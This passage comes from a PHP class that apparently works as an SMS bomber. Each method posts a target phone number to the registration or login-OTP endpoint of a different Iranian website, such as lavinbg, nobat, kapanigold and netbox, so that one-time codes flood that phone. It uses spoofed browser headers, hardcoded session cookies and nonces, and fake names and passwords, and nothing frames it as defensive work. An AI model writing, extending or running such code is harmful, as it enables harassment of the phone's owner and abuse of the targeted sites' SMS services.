        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            "Accept: */*",
            "Content-Type: application/json",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
            "Origin: https://www.mofidteb.com",
            "Referer: https://www.mofidteb.com/",
            "X-Requested-With: XMLHttpRequest",
            "Accept-Encoding: gzip, deflate, br, zstd",
            "Accept-Language: en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7,ar;q=0.6,nl;q=0.5"
            // اگر کوکی لازم باشه میتونی اینجا اضافه کنی
            // "Cookie: session_id=...; XSRF-TOKEN=..."
        ]);
    
        $response = curl_exec($ch);
        $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    
        curl_close($ch);
    
     
    
        
        
   
    }


    public function xiaomixiaomi()
    {
        return $this->s002("https://xiaomixiaomi.ir/api/v1/sessions/login_request", ["mobile_phone" => $this->$Number]);
    }

        
    public function lavinbg()
    {
        $url = "https://lavinbg.com/wp-admin/admin-ajax.php";

        $headers = [
            "Accept: */*",
            "Accept-Encoding: gzip, deflate, br, zstd",
            "Accept-Language: en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7,ar;q=0.6,nl;q=0.5",
            "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie: d_user_session=f7ffc3ca88a9f9cb64d0c0348e1d2625bd4b2893e7549ec3cfacb1b08c3a5040d665b5126f011c1d9d9e9e448d4d6230877e23836695817e531c8b46b863cd15; sbjs_migrations=1418474375998%3D1; sbjs_first_add=fd%3D2025-04-28%2014%3A46%3A56%7C%7C%7Cep%3Dhttps%3A%2F%2Flavinbg.com%2Fproduct-tag%2F%25D9%2585%25D8%25A7%25D8%25B1%25D8%25A7%25D9%2584%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29",
            "Origin: https://lavinbg.com",
            "Referer: https://lavinbg.com/product-tag/%D9%85%D8%A7%D8%B1%D8%A7%D9%84/?login=true&page=2&redirect_to=https%3A%2F%2Flavinbg.com%2Fproduct-tag%2F%25D9%2585%25D8%25A7%25D8%25B1%25D8%25A7%25D9%2584%2F",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
            "X-Requested-With: XMLHttpRequest"
        ];
        
        $data = [
            "login_digt_countrycode" => "98",
            "digits_phone" => $this->$Number,
            "digits_email" => "",
            "action_type" => "phone",
            "digits_reg_name" => "khald salhi",
            "digits_reg_lastname" => "salhi",
            "digits_process_register" => "1",
            "sms_otp" => "",
            "otp_step_1" => "1",
            "digits_otp_field" => "1",
            "digits" => "1",
            "action" => "digits_forms_ajax",
            "type" => "login",
            "digits_redirect_page" => "//lavinbg.com/product-tag/%D9%85%D8%A7%D8%B1%D8%A7%D9%84/?page=2&redirect_to=https%3A%2F%2Flavinbg.com%2Fproduct-tag%2F",
            "digits_form" => "d8c740341f",
            "_wp_http_referer" => "/product-tag/%D9%85%D8%A7%D8%B1%D8%A7%D9%84/?login=true&page=2&redirect_to=https%3A%2F%2Flavinbg.com%2Fproduct-tag%2F",
            "show_force_title" => "1",
            "container" => "digits_protected",
            "sub_action" => "sms_otp"
        ];
       
    
        // حالا فراخوانی تابع عمومی s002
        return $this->s002($url, http_build_query($data), $headers, $type=2);
    }

        
    public function melipayamak()
    {
        $url = 'https://sign.melipayamak.com/register';

        // شماره موبایل که میخوای بفرستی
        
        
        // ابتدا درخواست GET برای دریافت صفحه و استخراج توکن
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        ]);
        $response = curl_exec($ch);
        curl_close($ch);
        
        // استخراج توکن با regex
        if ($response && preg_match('/name="_token"\s*value="([^"]+)"/i', $response, $matches)) {
            $token = $matches[1];
           
            
            // حالا درخواست POST با توکن و شماره موبایل
            $postData = [
                '_token' => $token,
                'aff' => '',
                'first_name' => 'khald',   // اگر فقط موبایل میخوای میتونی اینارو حذف کنی
                'last_name' => 'salhi',
                'mobile_number' => $this->$Number,
                'product_id' => '22966'
            ];
        
            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL => $url,
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => http_build_query($postData),
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => 10,
                CURLOPT_HTTPHEADER => [
                    'Content-Type: application/x-www-form-urlencoded',
                ],
                CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            ]);
            $postResponse = curl_exec($ch);
            $httpStatus = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
        
            // نمایش وضعیت و پاسخ
        
        
        } else {
            die("توکن پیدا نشد.");
        }
        
       
    }

    public function kif() 
    {
        $data = array(
        'firstName' => 'khald',
        'lastName' => 'salhi',
        'mobile' => $this->$Number,
        'password' => 'ضصثقفغعهخح',
        'platform' => 'web',
        'refferCode' => ''
    );
    
    // URL مقصد
    $url = 'https://api.123kif.com/api/auth/Register';
    
    // ابتدا JSON encode داده‌ها
    $data_json = json_encode($data);
    
    // استفاده از cURL برای ارسال درخواست POST
    $ch = curl_init($url);
    
    // تنظیمات cURL
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_json);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/json', // نوع داده‌ها
        'Content-Length: ' . strlen($data_json) // طول محتوای ارسال شده
    ));
    
    // ارسال درخواست
    $response = curl_exec($ch);
    
    // بررسی خطا در ارسال
    if(curl_errno($ch)) {
       
    } else {
        // نمایش پاسخ سرور
      
    }
    
    // بستن ارتباط cURL
    curl_close($ch);
        
       
    }


        
    public function skmei()
    {
        $url = "https://skmei-iran.com/api/customer/member/register/";
    
        // دیتا
        $data = array(
            "email" => $this->$Number
        );
    
        // تبدیل به x-www-form-urlencoded
        $data = http_build_query($data);
    
        // هدرها
        $headers = array(
            "Accept: application/json, text/javascript, */*; q=0.01",
            "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
            "X-Requested-With: XMLHttpRequest",
            "Origin: https://skmei-iran.com",
            "Referer: https://skmei-iran.com/"
        );
    
        // شروع ارسال ریکوئست
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br, zstd"); // چون سرور جوابش فشرده است
    
        $response = curl_exec($ch);
    
        if (curl_errno($ch)) {
            echo "خطا: " . curl_error($ch);
        }
    
        curl_close($ch);
    
        return $response;
    }


        
    public function shimashoes()
{
    $url = "https://shimashoes.com/api/customer/member/register/";

    // دیتا
    $data = array(
        "email" => $this->$Number
    );

    // تبدیل به x-www-form-urlencoded
    $data = http_build_query($data);

    // هدرها
    $headers = array(
        "Accept: application/json, text/javascript, */*; q=0.01",
        "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "X-Requested-With: XMLHttpRequest",
        "Origin: https://shimashoes.com",
        "Referer: https://shimashoes.com/"
    );

    // شروع ارسال ریکوئست
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br, zstd"); // برای فشرده سازی پاسخ

    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        echo "خطا: " . curl_error($ch);
    }

    curl_close($ch);

    return $response;
}


    
public function avinehclinic()
{
    $url = "https://avineh.clinic/wp-admin/admin-ajax.php";

    // دیتا
    $data = array(
        "action" => "otp_send_verification_code",
        "otp_reg_phone" => $this->$Number
    );

    // تبدیل به x-www-form-urlencoded
    $data = http_build_query($data);

    // هدرها
    $headers = array(
        "Accept: */*",
        "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "X-Requested-With: XMLHttpRequest",
        "Origin: https://avineh.clinic",
        "Referer: https://avineh.clinic/"
    );

    // شروع ارسال ریکوئست
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br, zstd"); // برای پشتیبانی از فشرده سازی

    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        echo "خطا: " . curl_error($ch);
    }

    curl_close($ch);

    return $response;
}


public function nobat()
{
    $url = "https://api.nobat.ir/patient/login/phone";

    // داده‌ها
    $postFields = [
        'mobile' => $this->$Number,
        'use_emta_v2' => 'yes',
        'domain' => 'nobat'
    ];

    // ساختن مرز (boundary) برای فرمت multipart
    $boundary = uniqid();
    $delimiter = '----WebKitFormBoundary' . $boundary;

    // آماده کردن داده‌ها به صورت فرمت multipart
    $data = '';
    foreach ($postFields as $name => $content) {
        $data .= "--" . $delimiter . "\r\n";
        $data .= 'Content-Disposition: form-data; name="' . $name . "\"\r\n\r\n";
        $data .= $content . "\r\n";
    }
    $data .= "--" . $delimiter . "--\r\n";

    // هدرها
    $headers = [
        "Accept: application/json, text/plain, */*",
        "Content-Type: multipart/form-data; boundary=" . $delimiter,
        "Origin: https://user.nobat.ir",
        "Referer: https://user.nobat.ir/",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "nobat-cookie: {\"defaultCity\":\"1\"}",
    ];

    // ارسال ریکوئست
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br, zstd");

    $response = curl_exec($ch);

    if (curl_errno($ch)) {
       
    }

    curl_close($ch);

    return $response;
}


public function kapanigold()
{
    
    $url = "https://kapanigold.com/wp-admin/admin-ajax.php";

    // داده‌هایی که باید POST بشن
    $data = [
        "action" => "digits_check_mob",
        "countrycode" => "+98",
        "mobileNo" =>  $this->$Number,
        "csrf" => "0ac799ee6b",
        "login" => "1",
        "username" => "",
        "email" => "",
        "captcha" => "",
        "captcha_ses" => "",
        "digits" => "1",
        "json" => "1",
        "whatsapp" => "0",
        "mobmail" => $this->$Number,
        "dig_otp" => "",
        "dig_nounce" => "0ac799ee6b"
    ];
    
    // cURL برای ارسال درخواست
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    
    // هدرها اختیاری هستن ولی اگه لازم بود اضافه کن
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Content-Type: application/x-www-form-urlencoded",
        "Referer: https://kapanigold.com/",
        "Origin: https://kapanigold.com",
        "User-Agent: Mozilla/5.0"
    ]);
    
    // اجرای درخواست
    $response = curl_exec($ch);
    curl_close($ch);
    
    // خروجی پاسخ سرور
   
   
}


    
public function ttbol()
{
    $url = "https://ttbol.ir/wp-admin/admin-ajax.php";

    $data = [
        'digits_reg_name' => 'khald salhi',
        'digt_countrycode' => '98',
        'phone' => $this->$Number,
        'email' => 'khald6267408@gmail.com',
        'digits_process_register' => '1',
        'sms_otp' => '',
        'otp_step_1' => '1',
        'digits_otp_field' => '1',
        'optional_data' => 'optional_data',
        'action' => 'digits_forms_ajax',
        'type' => 'register',
        'dig_otp' => 'otp',
        'digits' => '1',
        'digits_redirect_page' => '//ttbol.ir/?page=1&redirect_to=https%3A%2F%2Fttbol.ir%2F',
        'captcha_code' => '',
        'digits_form' => '385bb11192',
        '_wp_http_referer' => '/?login=true&page=1&redirect_to=https%3A%2F%2Fttbol.ir%2F',
        'container' => 'digits_protected',
        'sub_action' => 'sms_otp'
    ];

    $headers = [
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        'Origin: https://ttbol.ir',
        'Referer: https://ttbol.ir/?login=true&page=1&redirect_to=https%3A%2F%2Fttbol.ir%2F',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
        'X-Requested-With: XMLHttpRequest'
    ];

    return $this->s002($url, http_build_query($data), $headers, $type=2);
}




public function narsisbeauty()
{
   

    // داده‌های POST
    $postFields = http_build_query([
        'phone_number' => $this->$Number,
        'wupp_remember_me' => 'on',
        'action' => 'wupp_sign_up'
    ]);
    
    // مقداردهی cURL
    $ch = curl_init("https://narsisbeauty.com/wp-admin/admin-ajax.php");
    
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        'Origin: https://narsisbeauty.com',
        'Referer: https://narsisbeauty.com/login-2/',
        'X-Requested-With: XMLHttpRequest',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'
    ]);
    
    // دریافت پاسخ
    $response = curl_exec($ch);
    
    curl_close($ch);
    

}

public function netboxS()
{
    
    // مقدار nonce از صفحه گرفته شده (باید معتبر باشه)
    $nonce = "9eeb86e25f";
    
    // آرایه‌ای از داده‌ها
    $data = [
        'countrycode' => '+98',
        'digregcode' => '+98',
        'username' => '',
        'code' => '',
        'captcha_ses' => '',
        'captcha' => '',
        'email' => '',
        'whatsapp' => '0',
        'json' => '1',
        'digits' => '1',
        'login' => '2',
        'dig_reg_mail' => '',
        'dig_nounce' => $nonce,
        'csrf' => $nonce,
        'digits_reg_mail' => $this->$Number,
        'dig_otp' => '',
        'action' => 'digits_check_mob',
        'mobileNo' => $this->$Number
    ];
    
    $postFields = http_build_query($data);
    
    // cURL initialization
    $ch = curl_init("https://netbox.info/wp-admin/admin-ajax.php");
    
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://netbox.info',
        'Referer: https://netbox.info/login/?redirect_to=https%3A%2F%2Fnetbox.info%2F',
        'X-Requested-With: XMLHttpRequest',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'
    ]);
    
    // اجرای درخواست
    $response = curl_exec($ch);
    
    // بررسی خطا
   
    
    curl_close($ch);
    

   
    

}



public function mrghavoot()
{
  
    $url = "https://mrghavoot.ir/wp-admin/admin-ajax.php";
    
    $data = [
        'digt_countrycode' => '98',
        'phone' => $this->$Number,
        'email' => 'khald6267408@gmail.com',
        'digits_reg_name' => 'khald salhi',
        'digits_reg_password' => 'YaZD4ziA5ucppG3',
        'digits_process_register' => '1',
        'otp_step_1' => '1',
        'signup_otp_mode' => '1',
        'optional_data' => 'optional_data',
        'action' => 'digits_forms_ajax',
        'type' => 'register',
        'digits' => '1',
        'digits_redirect_page' => '//mrghavoot.ir/banana-benefits-for-children/?page=2&redirect_to=https%3A%2F%2Fmrghavoot.ir%2Fbanana-benefits-for-children%2F',
        'digits_form' => '1c256ae905',
        '_wp_http_referer' => '/banana-benefits-for-children/?login=true&page=2&redirect_to=https%3A%2F%2Fmrghavoot.ir%2Fbanana-benefits-for-children%2F',
        'container' => 'digits_protected',
        'sub_action' => 'sms_otp'
    ];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'
    ]);
    $response = curl_exec($ch);
    curl_close($ch);
    
  
    
    
    
 

   
    

}


public function decorabo()
{
    $url = "https://decorabo.com/wp-admin/admin-ajax.php";
    
    // داده‌هایی که باید POST بشن
    $data = http_build_query([
        'action' => 'digits_check_mob',
        'countrycode' => '+98',
        'mobileNo' => $this->$Number,
        'csrf' => '08300bb7bb',
        'login' => '2',
        'username' => '',
        'email' => '',
        'captcha' => '',
        'captcha_ses' => '',
        'digits' => '1',
        'json' => '1',
        'whatsapp' => '0',
        'digregcode' => '+98',
        'digits_reg_mail' =>  $this->$Number,
        'dig_otp' => '',
        'code' => '',
        'dig_reg_mail' => '',
        'dig_nounce' => '08300bb7bb',
    ]);
    
    // آماده‌سازی cURL
    $ch = curl_init($url);
    
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate'); // پشتیبانی از encodingهای شناخته‌شده
    
    // هدرهای درخواست
    $headers = [
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With: XMLHttpRequest',
        'Origin: https://decorabo.com',
        'Referer: https://decorabo.com/product-category/%D9%85%D8%A8%D9%84%D9%85%D8%A7%D9%86/?login=true&page=2&redirect_to=https%3A%2F%2Fdecorabo.com%2Fproduct-category%2F%25D9%2585%25D8%25A8%25D9%2584%25D9%2585%25D8%25A7%25D9%2586%2F',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
        'Accept: */*',
        'Accept-Language: en-US,en;q=0.9,fa-IR;q=0.8',
        'Cookie: digits_countrycode=98; PHPSESSID=88e92d19bda4fa78c8f1524c1bd3f060',
    ];
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    
    // اجرای درخواست
    $response = curl_exec($ch);
    
    
    
    // بستن cURL
    curl_close($ch);
  
   
    

}


    
    
   
 
    
  
}
